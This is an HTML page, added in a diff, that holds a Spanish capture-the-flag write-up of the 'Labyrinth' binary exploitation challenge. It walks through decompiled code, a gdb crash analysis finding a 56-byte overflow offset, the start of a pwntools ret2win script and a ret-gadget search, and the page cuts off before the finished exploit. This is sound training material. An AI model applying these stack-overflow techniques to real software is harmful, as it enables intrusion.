@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup Labyrinth Cyber Apocalypse 2023</title>
+
+  <meta name="description" content="Resolución del challenge Labyrinth del Cyber Apocalypse 2023">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup Labyrinth Cyber Apocalypse 2023">
+  <meta name="twitter:description" content="Resolución del challenge Labyrinth del Cyber Apocalypse 2023">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/pwn.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup Labyrinth Cyber Apocalypse 2023">
+  <meta property="og:description" content="Resolución del challenge Labyrinth del Cyber Apocalypse 2023">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/pwn.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/pwn.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup Labyrinth Cyber Apocalypse 2023" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/ca2023" title="GatoGamer1155" class="blog-button">Cyber Apocalypse</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+              
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">Cyber Apocalypse 2023</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/pwn.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Labyrinth</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Además de un host se nos proporciona un <code class="language-plaintext highlighter-rouge">zip</code> que al descomprimirlo nos deja varios archivos, entre ellos una <code class="language-plaintext highlighter-rouge">flag</code> falsa, librerias de libc, y un <code class="language-plaintext highlighter-rouge">binario</code> compilado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls
+</span><span class="az"> glibc  </span><span class="p"> flag.txt  </span><span class="ve"> labyrinth  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos con <code class="language-plaintext highlighter-rouge">netcat</code> nos pide seleccionar una de 100 puertas, en caso de enviar una incorrecta nos dice que fallamos en el escape</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat</span><span class="p"> 165.224.124.42 31342
+</span><span class="sa">
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒     O     ▒          ▒
+▒-▸        ▒    '|'    ▒          ▒
+▒-▸        ▒    / \    ▒          ▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒
+
+Select door: 
+
+Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 
+Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 
+Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 
+Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 
+Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 
+Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 
+Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 
+Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 
+Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 
+Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100  
+
+>> 1
+
+</span><span class="ro">[-] YOU FAILED TO ESCAPE!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Abrimos el binario con <code class="language-plaintext highlighter-rouge">ghidra</code> para decompilarlo y en el apartado funciones podemos leer el codigo en C de la función <code class="language-plaintext highlighter-rouge">main</code> que se encuentra a la derecha</p>
+<a href="/ca2023/labyrinth/1.png" target="_blank"><div><p><img src="/ca2023/labyrinth/1.png"></p></div></a>
+
+<p class="plain-text">El siguiente codigo en c es toda la función <code class="language-plaintext highlighter-rouge">main</code> que analizaremos poco a poco</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">undefined8 </span><span class="na">main</span><span class="p">(</span><span class="no">void</span><span class="p">)
+
+{
+  </span><span class="no">int </span><span class="p">iVar1;
+  undefined8 local_38;
+  undefined8 local_30;
+  undefined8 local_28;
+  undefined8 local_20;
+  </span><span class="no">char </span><span class="o">*</span><span class="p">local_18;
+  ulong local_10;
+  
+  setup();
+  banner();
+  local_38 </span><span class="o">= </span><span class="mi">0</span><span class="p">;
+  local_30 </span><span class="o">= </span><span class="mi">0</span><span class="p">;
+  local_28 </span><span class="o">= </span><span class="mi">0</span><span class="p">;
+  local_20 </span><span class="o">= </span><span class="mi">0</span><span class="p">;
+  </span><span class="no">fwrite</span><span class="p">(</span><span class="s">"</span><span class="mi">\n</span><span class="s">Select door: </span><span class="mi">\n\n</span><span class="s">"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0x10</span><span class="p">,stdout);
+  </span><span class="o">for</span><span class="p"> (local_10 </span><span class="o">= </span><span class="mi">1</span><span class="p">; local_10 </span><span class="o">< </span><span class="mi">0x65</span><span class="p">; local_10 </span><span class="o">= </span><span class="p">local_10 </span><span class="o">+ </span><span class="mi">1</span><span class="p">) {
+    </span><span class="o">if</span><span class="p"> (local_10 </span><span class="o">< </span><span class="mi">10</span><span class="p">) {
+      </span><span class="no">fprintf</span><span class="p">(stdout,</span><span class="s">"Door: 00</span><span class="mi">%d</span><span class="s"> "</span><span class="p">,local_10);
+    }
+    </span><span class="o">else if</span><span class="p"> (local_10 </span><span class="o">< </span><span class="mi">100</span><span class="p">) {
+      </span><span class="no">fprintf</span><span class="p">(stdout,</span><span class="s">"Door: 0</span><span class="mi">%d</span><span class="s"> "</span><span class="p">,local_10);
+    }
+    </span><span class="o">else</span><span class="p"> {
+      </span><span class="no">fprintf</span><span class="p">(stdout,</span><span class="s">"Door: </span><span class="mi">%d</span><span class="s"> "</span><span class="p">,local_10);
+    }
+    </span><span class="o">if</span><span class="p"> ((local_10 </span><span class="o">% </span><span class="mi">10 </span><span class="o">== </span><span class="mi">0</span><span class="p">) </span><span class="o">&&</span><span class="p"> (local_10 </span><span class="o">!=</span><span class="mi"> 0</span><span class="p">)) {
+      </span><span class="no">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);
+    }
+  }
+  </span><span class="no">fwrite</span><span class="p">(</span><span class="o">&</span><span class="p">DAT_0040248f,</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">,stdout);
+  local_18 </span><span class="o">=</span><span class="p"> (</span><span class="no">char </span><span class="o">*</span><span class="p">)</span><span class="no">malloc</span><span class="p">(</span><span class="mi">0x10</span><span class="p">);
+  </span><span class="no">fgets</span><span class="p">(local_18,</span><span class="mi">5</span><span class="p">,stdin);
+  iVar1 </span><span class="o">= </span><span class="no">strncmp</span><span class="p">(local_18,</span><span class="s">"69"</span><span class="p">,</span><span class="mi">2</span><span class="p">);
+  </span><span class="o">if </span><span class="p">(iVar1 </span><span class="o">!= </span><span class="mi">0</span><span class="p">) {
+    iVar1 </span><span class="o">= </span><span class="no">strncmp</span><span class="p">(local_18,</span><span class="s">"069"</span><span class="p">,</span><span class="mi">3</span><span class="p">);
+    </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">!= </span><span class="mi">0</span><span class="p">) </span><span class="o">goto </span><span class="p">LAB_004015da;
+  }
+  </span><span class="no">fwrite</span><span class="p">(</span><span class="s">"</span><span class="m">\n</span><span class="s">You are heading to open the door but you suddenly see something on the wall:</span><span class="mi">\n\n</span><span class="s">\"Fly li ke a bird and be free!\"</span><span class="mi">\n\n</span><span class="s">Would you like to change the door you chose?</span><span class="mi">\n\n</span><span class="s">>> "</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0xa0</span><span class="p">,stdout);
+  </span><span class="no">fgets</span><span class="p">((</span><span class="no">char </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">local_38,</span><span class="mi">0x44</span><span class="p">,stdin);
+</span><span class="na">LAB_004015da</span><span class="p">:
+  </span><span class="no">fprintf</span><span class="p">(stdout,</span><span class="s">"</span><span class="mi">\n%s</span><span class="s">[-] YOU FAILED TO ESCAPE!</span><span class="mi">\n\n</span><span class="s">"</span><span class="p">,</span><span class="o">&</span><span class="p">DAT_00402541);
+  </span><span class="o">return </span><span class="mi">0</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Almacena nuestro input en la variable <code class="language-plaintext highlighter-rouge">local_18</code> luego la compara con la string <code class="language-plaintext highlighter-rouge">69</code> o <code class="language-plaintext highlighter-rouge">069</code> si son iguales imprime un mensaje y pide otro input con <code class="language-plaintext highlighter-rouge">fgets</code> la cual es vulnerable a <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> y solo define como buffer <code class="language-plaintext highlighter-rouge">0x44</code> o <code class="language-plaintext highlighter-rouge">68</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">fgets</span><span class="p">(local_18,</span><span class="mi">5</span><span class="p">,stdin);
+  iVar1 </span><span class="o">= </span><span class="no">strncmp</span><span class="p">(local_18,</span><span class="s">"69"</span><span class="p">,</span><span class="mi">2</span><span class="p">);
+  </span><span class="o">if </span><span class="p">(iVar1 </span><span class="o">!= </span><span class="mi">0</span><span class="p">) {
+    iVar1 </span><span class="o">= </span><span class="no">strncmp</span><span class="p">(local_18,</span><span class="s">"069"</span><span class="p">,</span><span class="mi">3</span><span class="p">);
+    </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">!= </span><span class="mi">0</span><span class="p">) </span><span class="o">goto </span><span class="p">LAB_004015da;
+  }
+  </span><span class="no">fwrite</span><span class="p">(</span><span class="s">"</span><span class="m">\n</span><span class="s">You are heading to open the door but you suddenly see something on the wall:</span><span class="mi">\n\n</span><span class="s">\"Fly li ke a bird and be free!\"</span><span class="mi">\n\n</span><span class="s">Would you like to change the door you chose?</span><span class="mi">\n\n</span><span class="s">>> "</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0xa0</span><span class="p">,stdout);  
+  </span><span class="no">fgets</span><span class="p">((</span><span class="no">char </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">local_38,</span><span class="mi">0x44</span><span class="p">,stdin);</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo no podemos explotar el clasico Stack ya que si miramos con <code class="language-plaintext highlighter-rouge">checksec</code> esta habilitado el <code class="language-plaintext highlighter-rouge">NX</code> que no nos permitira ejecutar shellcode en la pila</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec </span><span class="p">labyrinth 
+[</span><span class="az">*</span><span class="p">] '/home/kali/labyrinth'
+    Arch:     amd64-64-little
+    RELRO:    </span><span class="ve">Full RELRO</span><span class="p">
+    Stack:    </span><span class="ro">No canary found</span><span class="p">
+    NX:       </span><span class="ve">NX enabled</span><span class="p">
+    PIE:      </span><span class="ro">No PIE (0x400000)  </span><span class="p">
+    RUNPATH:  </span><span class="ro">b'./glibc/'</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Además del main tenemos una función llamada <code class="language-plaintext highlighter-rouge">escape_plan</code> la cual imprimime un mensaje de que hemos escapado y nos muestra la <code class="language-plaintext highlighter-rouge">flag</code> con la función <code class="language-plaintext highlighter-rouge">fputc</code></p>
+<a href="/ca2023/labyrinth/2.png" target="_blank"><div><p><img src="/ca2023/labyrinth/2.png"></p></div></a>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void </span><span class="na">escape_plan</span><span class="p">(</span><span class="no">void</span><span class="p">)
+
+{
+  </span><span class="na">ssize_t </span><span class="p">sVar1;
+  </span><span class="no">char </span><span class="p">local_d;
+  </span><span class="no">int </span><span class="p">local_c;
+  
+  </span><span class="no">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);
+  </span><span class="no">fwrite</span><span class="p">(</span><span class="o">&</span><span class="p">DAT_00402018,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0x1f0</span><span class="p">,stdout);
+  </span><span class="no">fprintf</span><span class="p">(stdout,</span><span class="s">"</span><span class="mi">\n%s</span><span class="s">Congratulations on escaping! Here is a sacred spell to help you continue your journey : </span><span class="mi">%s\n</span><span class="s">",</span><span class="o">&</span><span class="p">DAT_0040220e,</span><span class="o">&</span><span class="p">DAT_00402209);  
+  local_c </span><span class="o">= </span><span class="p">open(</span><span class="s">"./flag.txt"</span><span class="p">,</span><span class="mi">0</span><span class="p">);
+  </span><span class="o">if </span><span class="p">(local_c </span><span class="o">< </span><span class="mi">0</span><span class="p">) {
+    </span><span class="no">perror</span><span class="p">(</span><span class="s">"</span><span class="mi">\n</span><span class="s">Error opening flag.txt, please contact an Administrator.</span><span class="mi">\n\n</span><span class="s">"</span><span class="p">);
+                    </span><span class="c1">/* WARNING: Subroutine does not return */
+    </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
+  }
+  </span><span class="o">while</span><span class="p">( </span><span class="mi">true</span><span class="p"> ) {
+    sVar1 </span><span class="o">=</span><span class="p"> read(local_c,</span><span class="o">&</span><span class="p">local_d,</span><span class="mi">1</span><span class="p">);
+    </span><span class="o">if</span><span class="p"> (sVar1 </span><span class="o">< </span><span class="mi">1</span><span class="p">) </span><span class="o">break</span><span class="p">;
+    </span><span class="no">fputc</span><span class="p">((</span><span class="no">int</span><span class="p">)local_d,stdout);
+  }
+  close(local_c);
+  </span><span class="o">return</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Antes que nada busquemos el <code class="language-plaintext highlighter-rouge">offset</code> con <code class="language-plaintext highlighter-rouge">pattern_create</code> de <code class="language-plaintext highlighter-rouge">gdb</code> creamos un patron de caracteres, enviamos el <code class="language-plaintext highlighter-rouge">69</code> para la comparación del primer input y en el siguiente <code class="language-plaintext highlighter-rouge">fgets</code> enviamos nuestro patron de caracteres asi corrompe el programa</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb</span><span class="p"> -q ./labyrinth
+Reading symbols from </span><span class="ve">./labyrinth</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">./labyrinth</span><span class="p">)
+</span><span class="ro">gdb-peda$ </span><span class="p">pattern_create 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+</span><span class="ro">gdb-peda$ </span><span class="p">run
+Starting program: </span><span class="ve">/home/kali/labyrinth </span><span class="p">
+warning: Expected absolute pathname for libpthread in the inferior, but got </span><span class="ro">./glibc/libc.so.6</span><span class="p">.
+warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available. 
+
+</span><span class="sa">▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒     O     ▒          ▒
+▒-▸        ▒    '|'    ▒          ▒
+▒-▸        ▒    / \    ▒          ▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒
+
+Select door: 
+
+Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 
+Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 
+Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 
+Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 
+Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 
+Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 
+Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 
+Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 
+Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 
+Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 
+
+>> 69
+
+You are heading to open the door but you suddenly see something on the wall:
+
+"Fly like a bird and be free!"
+
+Would you like to change the door you chose?
+
+>> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+</span><span class="ro">
+[-] YOU FAILED TO ESCAPE!
+</span><span class="p">
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">
+[----------------------------------registers-----------------------------------]
+</span><span class="ve">RAX</span><span class="p">: 0x0 
+</span><span class="ve">RBX</span><span class="p">: 0x0 
+</span><span class="ve">RCX</span><span class="p">: </span><span class="ro">0x7ffff7d14a37</span><span class="p"> (&ltwrite+23>:	cmp    rax,0xfffffffffffff000)
+</span><span class="ve">RDX</span><span class="p">: 0x0 
+</span><span class="ve">RSI</span><span class="p">: </span><span class="az">0x7fffffffc360</span><span class="p"> --> 0x6d31333b315b1b0a 
+</span><span class="ve">RDI</span><span class="p">: </span><span class="az">0x7fffffffc240</span><span class="p"> --> </span><span class="ro">0x7ffff7c620d0</span><span class="p"> (&ltfunlockfile>:	endbr64)
+</span><span class="ve">RBP</span><span class="p">: 0x4147414131414162 ('bAA1AAGA')
+</span><span class="ve">RSP</span><span class="p">: </span><span class="az">0x7fffffffe4b8</span><span class="p"> ("AcAA2AAHAAd")
+</span><span class="ve">RIP</span><span class="p">: </span><span class="ro">0x401602</span><span class="p"> (&ltmain+509>:	ret)
+</span><span class="ve">R8 </span><span class="p">: 0x23 ('#')
+</span><span class="ve">R9 </span><span class="p">: </span><span class="ro">0x7ffff7d7cd70</span><span class="p"> (mov    r10,QWORD PTR [rsi-0x1b])
+</span><span class="ve">R10</span><span class="p">: 0x20554f59205d2d5b ('[-] YOU ')
+</span><span class="ve">R11</span><span class="p">: 0x246 
+</span><span class="ve">R12</span><span class="p">: </span><span class="az">0x7fffffffe5c8</span><span class="p"> --> </span><span class="az">0x7fffffffe8e7</span><span class="p"> ("/home/kali/labyrinth")
+</span><span class="ve">R13</span><span class="p">: </span><span class="ro">0x401405</span><span class="p"> (&ltmain>:	push   rbp)
+</span><span class="ve">R14</span><span class="p">: 0x0 
+</span><span class="ve">R15</span><span class="p">: </span><span class="az">0x7ffff7ffd040</span><span class="p"> --> </span><span class="az">0x7ffff7ffe2e0</span><span class="p"> --> 0x0
+</span><span class="ve">EFLAGS</span><span class="p">: 0x10206 (</span><span class="ve">carry </span><span class="ro">PARITY </span><span class="ve">adjust zero sign trap </span><span class="ro">INTERRUPT </span><span class="ve">direction overflow</span><span class="p">)
+</span><span class="az">[-------------------------------------code-------------------------------------]</span><span class="p">
+   0x4015f7 &ltmain+498>:	</span><span class="ro">call   0x4010c0 &ltfprintf@plt></span><span class="p">
+   0x4015fc &ltmain+503>:	</span><span class="c1">mov    eax,0x0</span><span class="p">
+   0x401601 &ltmain+508>:	</span><span class="c1">leave</span><span class="p">
+=> 0x401602 &ltmain+509>:	</span><span class="ve">ret</span><span class="p">
+   0x401603:	cs nop WORD PTR [rax+rax*1+0x0]
+   0x40160d:	nop    DWORD PTR [rax]
+   0x401610 <__libc_csu_init>:	push   r15
+   0x401612 <__libc_csu_init+2>:	lea    r15,[rip+0x2727]        # 0x403d40
+</span><span class="az">[------------------------------------stack-------------------------------------]</span><span class="p">
+0000| </span><span class="az">0x7fffffffe4b8</span><span class="p"> ("AcAA2AAHAAd")
+0008| </span><span class="az">0x7fffffffe4c0</span><span class="p"> --> 0x644141 ('AAd')
+0016| </span><span class="az">0x7fffffffe4c8</span><span class="p"> --> </span><span class="ro">0x401405</span><span class="p"> (&ltmain>:	push   rbp)
+0024| </span><span class="az">0x7fffffffe4d0</span><span class="p"> --> 0x100000000 
+0032| </span><span class="az">0x7fffffffe4d8</span><span class="p"> --> </span><span class="az">0x7fffffffe5c8</span><span class="p"> --> 0x7fffffffe8e7 ("/home/kali/labyrinth")
+0040| </span><span class="az">0x7fffffffe4e0</span><span class="p"> --> 0x0 
+0048| </span><span class="az">0x7fffffffe4e8</span><span class="p"> --> 0x4c333bf989bfe870 
+0056| </span><span class="az">0x7fffffffe4f0</span><span class="p"> --> </span><span class="az">0x7fffffffe5c8</span><span class="p"> --> 0x7fffffffe8e7 ("/home/kali/labyrinth")
+</span><span class="az">[------------------------------------------------------------------------------]</span><span class="p">
+Legend: </span><span class="ro">code</span><span class="p">, </span><span class="az">data</span><span class="p">, </span><span class="ve">rodata</span><span class="p">, value
+Stopped reason: </span><span class="ro">SIGSEGV</span><span class="az">
+0x0000000000401602 </span><span class="p">in </span><span class="am">main</span><span class="p"> ()
+</span><span class="ro">gdb-peda$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Buscamos el contenido en el registro <code class="language-plaintext highlighter-rouge">RSP</code> y su offset que nos dice son <code class="language-plaintext highlighter-rouge">56</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">gdb-peda$ </span><span class="p">x/wx $rsp
+</span><span class="az">0x7fffffffe4b8</span><span class="p">:	0x41416341
+</span><span class="ro">gdb-peda$ </span><span class="p">pattern_offset 0x41416341
+1094804289 found at offset: 56
+</span><span class="ro">gdb-peda$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos creando un script donde usaremos <code class="language-plaintext highlighter-rouge">pwntools</code>, iniciamos creando una conexión con un <code class="language-plaintext highlighter-rouge">argumento</code> que recibiremos el cual será <code class="language-plaintext highlighter-rouge">host:port</code> del target, además de eso definimos nuestro <code class="language-plaintext highlighter-rouge">junk</code> que seran <code class="language-plaintext highlighter-rouge">A</code> multiplicadas por el <code class="language-plaintext highlighter-rouge">offset</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="mi">*</span><span class="o">
+
+if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
+    log.failure(</span><span class="no">f</span><span class="s">"Uso: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &lthost:port>"</span><span class="p">)  
+    sys.exit(</span><span class="mi">1</span><span class="p">)
+
+host, port </span><span class="o">= </span><span class="p">sys.argv[</span><span class="mi">1</span><span class="p">].split(</span><span class="s">":"</span><span class="p">)
+shell </span><span class="o">= </span><span class="p">remote(host, port)
+
+offset </span><span class="o">= </span><span class="mi">56</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de sobrepasar el <code class="language-plaintext highlighter-rouge">offset</code> con nuestro <code class="language-plaintext highlighter-rouge">junk</code> lo que haremos es enviar una direccion de <code class="language-plaintext highlighter-rouge">retorno</code> seguida de la dirección de la función <code class="language-plaintext highlighter-rouge">escape_plan</code> para en el retorno no vuelva al <code class="language-plaintext highlighter-rouge">main</code> sino a la función y asi podamos leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">junk     </span><span class="o">-->     </span><span class="p">ret     </span><span class="o">-->     </span><span class="p">escape_plan  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo primero que necesitamos es un <code class="language-plaintext highlighter-rouge">ret</code> asi que con <code class="language-plaintext highlighter-rouge">ropper</code> le pasamos el binario buscaremos un <code class="language-plaintext highlighter-rouge">gadget</code> para asi obtener una dirección con esa instruccion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper</span><span class="p"> --file labyrinth --search </span><span class="am">"ret;"  </span><span class="p">
+</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
+</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
+</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
+</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: ret;
+
+</span><span class="ve">[INFO] </span><span class="p">File: labyrinth
+</span><span class="ro">0x0000000000401016</span><span class="p">: </span><span class="am">ret</span><span class="az">;</span>
+</code></pre></div></div><br>
+
